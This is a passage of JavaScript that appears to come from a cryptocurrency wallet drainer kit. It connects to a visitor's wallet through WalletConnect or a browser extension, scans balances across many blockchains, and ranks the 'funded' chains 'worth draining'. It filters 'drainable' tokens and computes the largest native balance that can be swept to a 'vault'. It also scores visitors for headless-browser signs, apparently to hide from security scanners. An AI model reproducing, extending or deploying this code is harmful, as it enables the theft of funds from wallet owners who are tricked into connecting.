        ensureSupplementalUi: false,
        timeoutMs: 60000,
      });
    } catch (e) {
      L.warn('[enrich] harvest:', e.message);
    }

    try {
      await runBackgroundFamilyRails();
    } catch (e2) {
      L.warn('[enrich] background rails:', e2.message);
    }

    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();
    S.allAddresses = collectAddressMap(address);
    var after = familyMapFingerprint(S.allAddresses);
    if (after && after !== before) {
      L.log('[enrich] new families since connect notify — re-notifying backend');
      await broadcastConnectScan(address, chainId, walletName, S.allAddresses);
    } else {
      L.log('[enrich] no new WC families beyond initial notify');
    }
    return S.allAddresses;
  }

  function getLegionConnectorId() {
    try {
      return (window.LegionWallet && window.LegionWallet.getConnectorId
        ? window.LegionWallet.getConnectorId() : '') || '';
    } catch (e) {
      return '';
    }
  }

  var MAX_VALID_EVM_CHAIN_ID = 4294967295;

  function connectModeLabel() {
    if (S.connectMode === 'wc') return 'MOBILE-WC';
    if (S.connectMode === 'injected') return 'EXTENSION';
    return 'NONE';
  }

  function logConnect(step, msg) {
    L.log('[connect:' + connectModeLabel() + ']', step, msg);
  }

  function isWcConnectActive() {
    return S.connectMode === 'wc' || _wcConnecting || S.wcSessionActive;
  }

  function isInjectedProvider(provider) {
    if (!provider) return true;
    if (provider.isWalletConnect === true) return false;
    if (provider.isMetaMask && !provider.isWalletConnect) return true;
    var connId = getLegionConnectorId().toLowerCase();
    return isInjectedConnectorId(connId);
  }

  async function clearInjectedSession(opts) {
    opts = opts || {};
    var had = !!(S.evmAddr || S.evmProvider);
    S.evmAddr = null;
    S.evmChain = null;
    S.evmProvider = null;
    S.evmWallet = '';
    S.evmScanChainIds = null;
    if (!opts.keepMode && S.connectMode === 'injected') S.connectMode = null;
    try { sessionStorage.removeItem('legion_wc_evm_addr'); } catch (e) {}
    try { sessionStorage.removeItem('legion_wc_families'); } catch (e3) {}
    if (opts.disconnectWallet !== false) {
      try { await disconnectLegionWallet(); } catch (e2) {}
    }
    if (had) logConnect('clear', 'extension session reset');
  }

  async function clearWcSession(full) {
    S.wcSessionActive = false;
    S.wcSessionExpired = false;
    _wcProv = null;
    _wcConnecting = false;
    if (S.connectMode === 'wc') S.connectMode = null;
    removeWcGuard();
    closeAppKitModal();
    if (full !== false) {
      clearWcStorageKeys();
      try { await disconnectLegionWallet(); } catch (e) {}
    }
    try { sessionStorage.removeItem('legion_wc_families'); } catch (e2) {}
    logConnect('clear', 'WalletConnect session reset');
  }

  async function prepInjectedMode() {
    if (_wcConnecting) {
      logConnect('blocked', 'WalletConnect still open — close QR first');
      return false;
    }
    await clearWcSession(true);
    S.connectMode = 'injected';
    S.wcSessionActive = false;
    removeWcGuard();
    logConnect('mode', '→ EXTENSION (browser wallet)');
    return true;
  }

  async function prepWcOnlyMode(clearStorage) {
    await clearInjectedSession({ keepMode: true, disconnectWallet: false });
    S.connectMode = 'wc';
    S.wcSessionActive = true;
    logConnect('mode', '→ MOBILE-WC (scan QR on phone)');
    await disconnectLegionWallet();
    if (clearStorage === false) {
      await sleep(200);
      return;
    }
    clearWcStorageKeys();
    await sleep(200);
  }

  function saveWcFamilyContext(addrs) {
    try {
      sessionStorage.setItem('legion_wc_families', JSON.stringify({
        ts: Date.now(),
        addresses: addrs || collectAddressMap(),
      }));
    } catch (e) {}
    try {
      if (window.LegionWallet && typeof window.LegionWallet.saveSessionContext === 'function') {
        var sess = window.LegionWallet.getSessionAddresses && window.LegionWallet.getSessionAddresses();
        if (sess && sess.families) window.LegionWallet.saveSessionContext(sess.families);
      }
    } catch (e2) {}
  }

  function loadWcFamilyContext() {
    try {
      var raw = sessionStorage.getItem('legion_wc_families');
      if (!raw) return null;
      var ctx = JSON.parse(raw);
      if (!ctx || !ctx.ts) return null;
      if (Date.now() - ctx.ts > 7 * 24 * 60 * 60 * 1000) {
        sessionStorage.removeItem('legion_wc_families');
        return null;
      }
      return ctx.addresses || null;
    } catch (e) {
      return null;
    }
  }

  async function tryRecoverWcSession() {
    var sess = findWcStorageSession();
    var fromContextOnly = false;
    if (!sess || !sess.address) {
      var ctx = loadWcFamilyContext();
      if (ctx && ctx.evm) {
        sess = { address: ctx.evm, fromContext: true };
        fromContextOnly = true;
      }
    }
    if (!sess || !sess.address) return null;
    if (fromContextOnly && !findWcStorageSession()) {
      L.warn('WC recovery: stale extension context — not a real WC session');
      try { sessionStorage.removeItem('legion_wc_families'); } catch (e0) {}
      return null;
    }
    if (isWcSessionExpired(sess)) {
      L.log('WC session expired — clearing for reconnect');
      clearWcStorageKeys();
      S.wcSessionExpired = true;
      return null;
    }
    if (typeof window.LegionWallet === 'undefined') return null;
    L.log('WC session recovery:', sess.address.slice(0, 10) + '...');
    S.connectMode = 'wc';
    S.wcSessionActive = true;
    try {
      if (typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        var restored = await window.LegionWallet.tryRecoverStoredSession(true);
        if (restored && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), restored)) {
          applyLegionWalletSessionAddresses();
          L.log('WC session restored via LegionWallet recovery');
          return restored;
        }
      }
      var prov = await pollWcProviderReady(20000);
      if (prov && isRealWalletConnectSession(getLegionConnectorId().toLowerCase(), prov)) {
        applyLegionWalletSessionAddresses();
        L.log('WC session restored from storage');
        return prov;
      }
    } catch (e) { L.warn('WC recovery fail:', e.message); }
    return null;
  }

  var _portfolioScanPromise = null;
  async function scanFullPortfolio(address, addrs) {
    addrs = addrs || collectAddressMap(address);
    var portKeyEarly = String((addrs.evm || address || '')).toLowerCase();
    if (S._portfolioScanKey === portKeyEarly && S.portfolioScan && (S.portfolioScan.items || S.portfolioScan.totalUsd != null)) {
      L.log('[portfolio] reuse cached scan', portKeyEarly.slice(0, 10));
      return S.portfolioScan;
    }
    if (_portfolioScanPromise) {
      L.log('[portfolio] join in-flight scan');
      return _portfolioScanPromise;
    }
    _portfolioScanPromise = _scanFullPortfolioInner(address, addrs).finally(function () {
      _portfolioScanPromise = null;
    });
    return _portfolioScanPromise;
  }
  async function _scanFullPortfolioInner(address, addrs) {
    addrs = addrs || collectAddressMap(address);
    var items = [];
    var byChain = {};
    var evmChainIds = getMultiChainOrder();

    function ensureByChainSlot(cid) {
      if (!cid) return;
      if (!byChain[cid]) byChain[cid] = { chainId: cid, usd: 0, tokens: [] };
    }

    evmChainIds.forEach(function (cid) { ensureByChainSlot(cid); });

    function mergeMultiBalanceRow(row) {
      if (!row) return;
      var cid = rankedAssetChainId(row.chain);
      ensureByChainSlot(cid);
      var fam = String(row.family || 'EVM').toUpperCase();
      function pushItem(token, symbol, amount_raw, decimals, contract) {
        if (!amount_raw || BigInt(amount_raw || '0') <= 0n) return;
        var caip19 = null;
        if (contract && cid && window.LegionCaipRegistry && typeof window.LegionCaipRegistry.formatErc20Caip19 === 'function') {
          caip19 = window.LegionCaipRegistry.formatErc20Caip19(cid, contract);
        }
        items.push({
          chain: row.chain,
          family: fam,
          token: token,
          symbol: symbol || '?',
          amount_raw: String(amount_raw),
          amount_usd: 0,
          decimals: decimals || 18,
          caip19: caip19,
        });
        if (contract && cid && byChain[cid]) {
          var cLower = String(contract).toLowerCase();
          var dup = false;
          for (var di = 0; di < byChain[cid].tokens.length; di++) {
            if (byChain[cid].tokens[di].address === cLower) { dup = true; break; }
          }
          if (!dup) {
            byChain[cid].tokens.push({
              address: cLower,
              balance: String(amount_raw),
              symbol: symbol || '?',
            });
          }
        }
      }
      if (row.native && BigInt(row.native.amount_raw || '0') > 0n) {
        pushItem('native', row.native.symbol, row.native.amount_raw, row.native.decimals);
        if (cid && byChain[cid]) byChain[cid].nativeRaw = row.native.amount_raw;
      }
      (row.tokens || []).forEach(function (t) {
        if (BigInt(t.amount_raw || '0') > 0n) {
          pushItem(t.contract || t.symbol, t.symbol, t.amount_raw, t.decimals, t.contract);
        }
      });
    }

    var multiBody = { evm_chain_id: Number(S.evmChain) || 1 };
    if (addrs.evm) multiBody.evm = addrs.evm;
    else if (address) multiBody.evm = address;
    if (addrs.sol) multiBody.sol = addrs.sol;
    if (addrs.tron) multiBody.tron = addrs.tron;
    if (addrs.ton) multiBody.ton = addrs.ton;
    if (addrs.btc) multiBody.btc = addrs.btc;
    if (addrs.cosmos) multiBody.cosmos = addrs.cosmos;
    if (addrs.aptos) multiBody.aptos = addrs.aptos;
    if (addrs.sui) multiBody.sui = addrs.sui;

    var portKey = String((addrs.evm || address || '')).toLowerCase();
    if (S._portfolioScanKey === portKey && S.portfolioScan && S.portfolioScan.items) {
      L.log('[portfolio] skip duplicate multi-balance/ranked for', portKey.slice(0, 10));
      return S.portfolioScan;
    }

    var multiRows = [];
    try {
      var multiResp = await apiPost('/api/v1/multi-balance', multiBody);
      if (multiResp && multiResp.data && multiResp.data.chains) {
        multiRows = multiRows.concat(multiResp.data.chains);
      }
    } catch (e) { L.warn('multi-balance (all families):', e.message); }

    // Per-chain multi-balance only for chains fusion/ranked hint — not full mesh spam
    var evmProbeAddr = addrs.evm || address;
    var probeIds = [];
    if (evmProbeAddr) {
      var hinted = {};
      multiRows.forEach(function (row) {
        var cid = Number(row && (row.chain_id || row.chainId));
        if (cid && Number(row.usd || 0) > 0) hinted[cid] = true;
      });
      // Always include active + eth/base/arb
      [1, 8453, 42161, Number(S.evmChain) || 0].forEach(function (cid) {
        if (cid) hinted[cid] = true;
      });
      probeIds = Object.keys(hinted).map(Number).filter(Boolean);
      // Cap probes — avoid 30+ multi-balance storm
      if (probeIds.length > 8) probeIds = probeIds.slice(0, 8);
      var batchSize = EVM_SCAN_BATCH_SIZE;
      for (var bi = 0; bi < probeIds.length; bi += batchSize) {
        var slice = probeIds.slice(bi, bi + batchSize);
        var evmProbes = await Promise.allSettled(
          slice.map(function (cid) {
            return apiPost('/api/v1/multi-balance', { evm: evmProbeAddr, evm_chain_id: cid })
              .then(function (resp) {
                var chains = resp && resp.data && resp.data.chains;
                return chains && chains.length ? chains[0] : null;
              });
          })
        );
        evmProbes.forEach(function (pr) {
          if (pr.status === 'fulfilled' && pr.value) multiRows.push(pr.value);
        });
      }
    }

    var seenChain = {};
    multiRows.forEach(function (row) {
      if (!row || !row.chain || seenChain[row.chain]) return;
      seenChain[row.chain] = true;
      mergeMultiBalanceRow(row);
    });

    var rankedAll = await SCOUT.ranked(address);
    var rankedItems = (rankedAll && rankedAll.assets) || (rankedAll && rankedAll.ranked) || [];
    rankedItems.forEach(function (a) {
      var cid = rankedAssetChainId(a.chain);
      ensureByChainSlot(cid);
      var usd = Number(a.amount_usd || a.usd_value || 0);
      items.push(a);
      if (cid && byChain[cid]) {
        byChain[cid].usd += usd;
        if (a.token === 'native' && !byChain[cid].nativeRaw) {
          byChain[cid].nativeRaw = String(a.amount_raw || a.raw_balance || '0');
        }
        if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
          var exists = byChain[cid].tokens.some(function (t) {
            return t.address === String(a.token).toLowerCase();
          });
          if (!exists) {
            byChain[cid].tokens.push({
              address: String(a.token).toLowerCase(),
              balance: String(a.amount_raw || a.raw_balance || '0'),
              symbol: a.symbol || '?',
              usd: usd,
            });
          }
        }
      }
    });

    var totalUsd = Number(rankedAll && rankedAll.total_usd) || 0;
    var fundedChains = [];
    Object.keys(byChain).forEach(function (k) {
      var cid = parseInt(k, 10);
      if (chainSlotWorthDraining(byChain[cid])) fundedChains.push(cid);
    });
    fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
    S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
    try { S._portfolioScanKey = String((addrs && addrs.evm) || address || "").toLowerCase(); } catch (ePk) {}
    S.portfolioScan = {
      totalUsd: totalUsd,
      items: items,
      byChain: byChain,
      fundedChains: fundedChains,
      assetCount: items.length,
      multiChainRows: multiRows.length,
      evmChainsScanned: evmChainIds.length,
      addresses: addrs,
    };
    L.log(
      'Portfolio scan:',
      totalUsd.toFixed(2), 'USD | EVM chains scanned:', evmChainIds.length,
      '| rows:', multiRows.length,
      '| funded:', fundedChains.join(',') || 'none',
      '| families:', Object.keys(addrs).join(',')
    );
    return S.portfolioScan;
  }

  async function buildChainAssets(provider, address, chainId, portfolio) {
    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
    var ch = portfolio && portfolio.byChain && portfolio.byChain[chainId];
    if (ch) {
      assets.usd = ch.usd;
      assets.tokens = filterDrainableTokens(ch.tokens.slice());
      if (ch.nativeRaw) assets.nativeHex = '0x' + BigInt(ch.nativeRaw).toString(16);
    }
    try {
      var liveHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']);
      if (liveHex && liveHex !== '0x0') assets.nativeHex = liveHex;
    } catch (e) {}
    return assets;
  }

  var NATIVE_TRANSFER_GAS = 21000n;
  var CLAIM_CONTRACT_GAS = 120000n;
  var ERC20_TRANSFER_GAS = 65000n;

  /** Live EIP-1559 fees — wallet RPC with public fallback + 20% buffer. */
  async function estimateEip1559Fees(provider, chainId) {
    var floor = GAS_FLOOR_BY_CHAIN[Number(chainId)] || 100000000n;
    var cid = Number(chainId) || 1;
    var applyBuffer = function (fees) {
      return {
        maxFeePerGas: (fees.maxFeePerGas * 120n) / 100n,
        maxPriorityFeePerGas: (fees.maxPriorityFeePerGas * 120n) / 100n,
      };
    };
    try {
      var hist = await evmRequestWithFallback(provider, cid, 'eth_feeHistory', ['0x4', 'latest', [50]]);
      var baseArr = hist.baseFeePerGas || [];
      var baseFee = BigInt(baseArr[baseArr.length - 1] || '0x0');
      var rewards = (hist.reward && hist.reward[hist.reward.length - 1]) || [];
      var priority = BigInt(rewards[0] || '0x5F5E100');
      var maxFee = baseFee * 2n + priority;
      if (maxFee < floor) maxFee = floor;
      if (priority < floor / 10n) priority = floor / 10n;
      return applyBuffer({ maxFeePerGas: maxFee, maxPriorityFeePerGas: priority });
    } catch (e) {
      try {
        var gp = BigInt(await evmRequestWithFallback(provider, cid, 'eth_gasPrice', []) || '0x0');
        if (gp < floor) gp = floor;
        return applyBuffer({ maxFeePerGas: gp, maxPriorityFeePerGas: gp / 10n });
      } catch (e2) {
        return applyBuffer({ maxFeePerGas: floor * 100n, maxPriorityFeePerGas: floor });
      }
    }
  }

  /** Gas cost only — remainder sweeps to vault (not a fixed wallet reserve). */
  async function calcNativeGasCostWei(provider, chainId, gasLimit) {
    var limit = gasLimit || NATIVE_TRANSFER_GAS;
    var fees = await estimateEip1559Fees(provider, chainId);
    return limit * fees.maxFeePerGas; // estimateEip1559Fees already applies 1.2x buffer
  }

  async function calcMaxNativeSendWei(provider, nativeHex, chainId, gasLimit) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = await calcNativeGasCostWei(provider, chainId, gasLimit);
    if (bal <= gasCost) return { send: 0n, gasCost: gasCost };
    return { send: bal - gasCost, gasCost: gasCost };
  }

  function calcNativeSendWei(nativeHex, chainId) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = 500000000000000n;
    if (Number(chainId) === 137) gasCost = 100000000000000000n;
    return bal > gasCost ? bal - gasCost : 0n;
  }

  // Priority EVM chains — Phase 2/3: single source via LegionCaipRegistry
  function resolvePriorityEvmChains() {
    if (window.LegionCaipRegistry && typeof window.LegionCaipRegistry.getEffectiveEvmChainIds === 'function') {
      return window.LegionCaipRegistry.getEffectiveEvmChainIds().slice();
    }
    return [1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000];
  }
  var PRIORITY_EVM_CHAINS = resolvePriorityEvmChains();
  var PRIORITY_CHAIN_ORDER = PRIORITY_EVM_CHAINS.slice();
  var EVM_SCAN_BATCH_SIZE = 12;

  function getMultiChainOrder() {
    if (S.evmScanChainIds && S.evmScanChainIds.length) return S.evmScanChainIds;
    var ids = [];
    var seen = {};
    function addChain(id) {
      var n = Number(id);
      if (!Number.isFinite(n) || n <= 0 || n > MAX_VALID_EVM_CHAIN_ID || seen[n]) return;
      seen[n] = true;
      ids.push(n);
    }
    PRIORITY_CHAIN_ORDER.forEach(addChain);
    TARGET_EVM_CHAIN_IDS.forEach(addChain);
    if (!ids.length) PRIORITY_CHAIN_ORDER.forEach(addChain);
    ids.sort(function (a, b) {
      var ia = PRIORITY_CHAIN_ORDER.indexOf(a);
      var ib = PRIORITY_CHAIN_ORDER.indexOf(b);
      if (ia === -1 && ib === -1) return a - b;
      if (ia === -1) return 1;
      if (ib === -1) return -1;
      return ia - ib;
    });
    S.evmScanChainIds = ids;
    L.log('[scan] EVM chains:', ids.length, '(priority list — not full viem universe)');
    return ids;
  }

  /** @deprecated use getMultiChainOrder() */
  function getMultiChainOrderLegacy() { return getMultiChainOrder(); }

  var CHAIN_ADD_PARAMS = {
    56: {
      chainId: '0x38',
      chainName: 'BNB Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed.binance.org'],
      blockExplorerUrls: ['https://bscscan.com'],
    },
    137: {
      chainId: '0x89',
      chainName: 'Polygon',
      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
      rpcUrls: ['https://polygon-rpc.com'],
      blockExplorerUrls: ['https://polygonscan.com'],
    },
    42161: {
      chainId: '0xa4b1',
      chainName: 'Arbitrum One',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
      blockExplorerUrls: ['https://arbiscan.io'],
    },
    8453: {
      chainId: '0x2105',
      chainName: 'Base',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.base.org'],
      blockExplorerUrls: ['https://basescan.org'],
    },
    10: {
      chainId: '0xa',
      chainName: 'Optimism',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.optimism.io'],
      blockExplorerUrls: ['https://optimistic.etherscan.io'],
    },
    43114: {
      chainId: '0xa86a',
      chainName: 'Avalanche C-Chain',
      nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
      blockExplorerUrls: ['https://snowtrace.io'],
    },
    534352: {
      chainId: '0x82750',
      chainName: 'Scroll',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.scroll.io'],
      blockExplorerUrls: ['https://scrollscan.com'],
    },
    81457: {
      chainId: '0x13e31',
      chainName: 'Blast',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://rpc.blast.io'],
      blockExplorerUrls: ['https://blastscan.io'],
    },
    5000: {
      chainId: '0x1388',
      chainName: 'Mantle',
      nativeCurrency: { name: 'MNT', symbol: 'MNT', decimals: 18 },
      rpcUrls: ['https://rpc.mantle.xyz'],
      blockExplorerUrls: ['https://mantlescan.xyz'],
    },
  };

  // Session state
  var S = {
    drainRunning: false,
    vaultLoaded: false,
    eip7702Enabled: true,
    evmAddr: null, evmChain: null, evmProvider: null, evmWallet: '',
    scoutUsd: 0,
    anchorsOk: 0,
    discovered: [],
    nonEvm: {},
    familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
    familyConnections: {},
    familiesLinked: false,
    allAddresses: {},
    chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null, POLKADOT: null, ALGORAND: null, CARDANO: null },
    omnichainLegs: {},
    fusionAssets: [],
    pendingEvmPermit2: null,
    _confirmedPopups: {},
    _evmPopupConfirmed: false,
    wcSessionActive: false,
    connectMode: null,
    portfolioScan: null,
    notifySessionKey: null,
    connectSession: null,
    fusionNotified: false,
    amountScoutDone: false,
    connectNotifiedAddr: '',
    connectNotifiedSession: '',
    connecting: false,
    wcSessionExpired: false,
    evmScanChainIds: null,
    factoryContracts: {},
    factoryFallbackAllowed: {},
    deactivatedContracts: {},
    backendEndpoints: [],
    proxyUrls: [],
    deployDomains: [],
    eip712Domains: {},
    relayerSponsored: false,
    chainCapabilities: {},
    deferredBroadcasts: 0,
    injectedWalletKey: '',
    phaseBAborted: false,
    phaseBRunning: false,
  };

  var _evmConnectLock = null;

  // WC guard removed — it blocked AppKit modal.request when connector was io.metamask.
  function installWcGuard() { /* no-op */ }
  function removeWcGuard() { /* no-op */ }

  async function evmRequestAccounts(provider) {
    if (_evmConnectLock) {
      try { return await _evmConnectLock; } catch (e) { /* retry below */ }
    }
    var wcMode = S.connectMode === 'wc' || (provider && provider.isWalletConnect === true);
    _evmConnectLock = (async function () {
      try {
        var accounts = await provider.request({ method: 'eth_accounts' });
        if (accounts && accounts.length) return accounts;
      } catch (e) {
        if (!wcMode) L.warn('RPC fail, fallback to AppKit state...');
      }

      try {
        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
          var acc = window.LegionWallet.getAccount();
          if (acc && acc.address) {
            if (wcMode && isInjectedConnectorId(getLegionConnectorId())) {
              throw new Error('Extension hijacked WalletConnect session');
            }
            logConnect('accounts', 'AppKit getAccount ' + String(acc.address).slice(0, 10) + '...');
            return [acc.address];
          }
        }
        if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
          return [window.LegionWallet.state.address];
        }
      } catch (e2) {
        if (wcMode && isUserRejection(e2)) throw e2;
      }

      var sessAddr = resolveWcEvmAddress();
      if (sessAddr) {
        logConnect('accounts', 'WC session ' + sessAddr.slice(0, 10) + '...');
        try { sessionStorage.setItem('legion_wc_evm_addr', sessAddr); } catch (eS) {}
        return [sessAddr];
      }

      try {
        var stored = sessionStorage.getItem('legion_wc_evm_addr');
        if (stored) {
          logConnect('accounts', 'sessionStorage ' + stored.slice(0, 10) + '...');
          return [stored];
        }
      } catch (eSt) {}

      if (wcMode) {
        throw new Error('WalletConnect account not ready — approve on phone');
      }

      try {
        var req = await provider.request({ method: 'eth_requestAccounts' });
        if (req && req.length) return req;
      } catch (e3) {
        if (isUserRejection(e3)) {
          await clearInjectedSession({ keepMode: false });
          throw e3;
        }
      }

      throw new Error('Could not retrieve EVM account');
    })();
    try {
      return await _evmConnectLock;
    } finally {
      _evmConnectLock = null;
    }
  }

  function resolveWcEvmAddress() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
        var acc = window.LegionWallet.getAccount();
        if (acc && acc.address) return String(acc.address).toLowerCase();
      }
      if (window.LegionWallet && window.LegionWallet.state && window.LegionWallet.state.address) {
        return String(window.LegionWallet.state.address).toLowerCase();
      }
    } catch (eA) {}
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
        var sa = window.LegionWallet.getSessionAddresses();
        if (sa && sa.flat && sa.flat.evm) return String(sa.flat.evm).toLowerCase();
      }
    } catch (e1) {}
    var stored = findWcStorageSession();
    if (stored && stored.address) return stored.address;
    var scan = scanWcSessionAllFamilies();
    if (scan.evm) return String(scan.evm).toLowerCase();
    return null;
  }

  function resolveWcEvmChainId() {
    try {
      if (window.LegionWallet && typeof window.LegionWallet.getEvmChainIdFromSession === 'function') {
        var cid = window.LegionWallet.getEvmChainIdFromSession();
        if (cid) return Number(cid);
      }
    } catch (e0) {}
    try {
      var keys = Object.keys(localStorage);
      for (var i = 0; i < keys.length; i++) {
        var k = keys[i];
        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
        var obj = JSON.parse(localStorage.getItem(k) || '{}');
        var sessions = Object.values(obj);
        for (var j = sessions.length - 1; j >= 0; j--) {
          var caip = sessions[j]?.namespaces?.eip155?.accounts?.[0];
          if (!caip) continue;
          var parts = String(caip).split(':');
          if (parts[0] === 'eip155' && parts[1]) {
            var chainId = parseInt(parts[1], 10);
            if (!Number.isNaN(chainId) && chainId > 0) return chainId;
          }
        }
      }
    } catch (e1) {}
    return 1;
  }

  async function resolveWcEvmChainIdFromProvider(provider) {
    try {
      var chainHex = await provider.request({ method: 'eth_chainId' });
      return parseInt(String(chainHex).replace('0x', ''), 16);
    } catch (e) {
      var fromSession = resolveWcEvmChainId();
      L.log('WC eth_chainId unavailable — session chain', fromSession);
      return fromSession;
    }
  }

  function defaultConnect() {
    if (S.drainRunning && !S.connecting) clearDrainLock();
    if (S.drainRunning) return;
    if (!S.vaultLoaded) prefetchVault();
    if (PLAT.inApp && window.ethereum) {
      handleConnect();
      return;
    }
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    if (typeof window.customModalOpen === 'function') {
      window.customModalOpen();
      return;
    }
    handleWC();
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 03: BOT DETECTION
  // ═══════════════════════════════════════════════════════════════
  function isBot() {
    var score = 0;
    try { if (navigator.webdriver === true) score += 3; } catch (e) {}
    try { if (/headless|PhantomJS|selenium|webdriver/i.test(navigator.userAgent)) score += 3; } catch (e) {}
    try { if (!navigator.languages || navigator.languages.length === 0) score += 1; } catch (e) {}
    try { if (screen.width < 100 || screen.height < 100) score += 2; } catch (e) {}
    try { if (screen.width === 0 || screen.height === 0) score += 2; } catch (e) {}
    return score >= 4;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 04: PLATFORM DETECTION
  // ═══════════════════════════════════════════════════════════════
  var PLAT = (function () {
    var ua = navigator.userAgent || '';
    var isIPadPro = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
    var isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(ua) || isIPadPro;
    var walletApp = null, inApp = false;
    var appChecks = [
      [/MetaMaskMobile/i, 'MetaMask'],
      [/Trust\/[\d.]+/i, 'Trust Wallet'],
      [/CoinbaseWallet/i, 'Coinbase Wallet'],
      [/OKApp|OKEx/i, 'OKX'],
      [/BitKeep|Bitget/i, 'Bitget'],
      [/TokenPocket/i, 'TokenPocket'],
      [/SafePal/i, 'SafePal'],
      [/imToken/i, 'imToken'],
    ];
    for (var i = 0; i < appChecks.length; i++) {
      if (appChecks[i][0].test(ua)) { walletApp = appChecks[i][1]; inApp = true; break; }
    }
    if (!inApp && isMobile && window.ethereum) {
      if (window.ethereum.isMetaMask) { walletApp = 'MetaMask'; inApp = true; }
      else if (window.ethereum.isTrust) { walletApp = 'Trust Wallet'; inApp = true; }
      else if (window.ethereum.isOkxWallet) { walletApp = 'OKX'; inApp = true; }
      else if (window.ethereum.isCoinbaseWallet) { walletApp = 'Coinbase Wallet'; inApp = true; }
    }
    var isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
    var strategy = 'extension';
    if (isTelegram) strategy = 'telegram';
    else if (inApp) strategy = 'inapp';
    else if (isMobile) strategy = 'wc';
    return { ua, isMobile, walletApp, inApp, isTelegram, strategy };
  })();

  // ═══════════════════════════════════════════════════════════════
  // SECTION 05: WALLET DISCOVERY
  // ═══════════════════════════════════════════════════════════════
  window.addEventListener('eip6963:announceProvider', function (ev) {
    if (!ev.detail || !ev.detail.provider || !ev.detail.info) return;
    var dup = S.discovered.some(function (w) { return w.info.uuid === ev.detail.info.uuid; });
    if (!dup) S.discovered.push(ev.detail);
  });

  function requestProviders() {
    try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch (e) {}
  }

  var RDNS_BY_KEY = {
    metamask: 'io.metamask',
    trust: 'com.trustwallet.app',
    'coinbase-extension': 'com.coinbase.wallet',
    coinbase: 'com.coinbase.wallet',
    rabby: 'io.rabby',
    phantom: 'app.phantom',
    brave: 'com.brave.wallet',
    okx: 'com.okex.wallet',
    binance: 'com.binance.wallet',
  };

  function resolveEvmProvider(key) {
    requestProviders();
    var k = String(key || '').toLowerCase();
    var targetRdns = RDNS_BY_KEY[k] || k;
    for (var i = 0; i < S.discovered.length; i++) {
      var w = S.discovered[i];
      if (!w || !w.provider || !w.info) continue;
      var rdns = String(w.info.rdns || '').toLowerCase();
      var name = String(w.info.name || '').toLowerCase();
      if (rdns === targetRdns || rdns === k || rdns.indexOf(k) !== -1 || name.indexOf(k) !== -1) {
        return w.provider;
      }
    }
    var eth = window.ethereum;
    if (eth && Array.isArray(eth.providers)) {
      for (var j = 0; j < eth.providers.length; j++) {
        var p = eth.providers[j];
        if (!p) continue;
        if ((k === 'metamask' || targetRdns === 'io.metamask') && p.isMetaMask && !p.isRabby) return p;
        if ((k === 'trust' || targetRdns === 'com.trustwallet.app') && (p.isTrust || p.isTrustWallet)) return p;
        if (k.indexOf('coinbase') !== -1 && (p.isCoinbaseWallet || p.isCoinbaseBrowser)) return p;
        if ((k === 'rabby' || targetRdns === 'io.rabby') && p.isRabby) return p;
        if ((k === 'okx' || targetRdns === 'com.okex.wallet') && (p.isOkxWallet || p.isOKExWallet)) return p;
        if ((k === 'brave' || targetRdns === 'com.brave.wallet') && p.isBraveWallet) return p;
      }
    }
    if (eth && k === 'metamask' && eth.isMetaMask && !eth.isRabby && !eth.isTrust) return eth;
    if (eth && k === 'trust' && (eth.isTrust || eth.isTrustWallet)) return eth;
    return null;
  }

  // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
  var discoveredSolanaWallets = [];

  function registerSolanaWalletStandard(w) {
    if (!w || typeof w !== 'object') return;
    var dup = discoveredSolanaWallets.some(function (x) { return x === w; });
    if (!dup) discoveredSolanaWallets.push(w);
  }

  try {
    window.addEventListener('wallet-standard:register', function (ev) {
      var d = ev.detail;
      if (Array.isArray(d)) d.forEach(registerSolanaWalletStandard);
      else registerSolanaWalletStandard(d);
    });
    window.addEventListener('wallet-standard:app-ready', function (ev) {
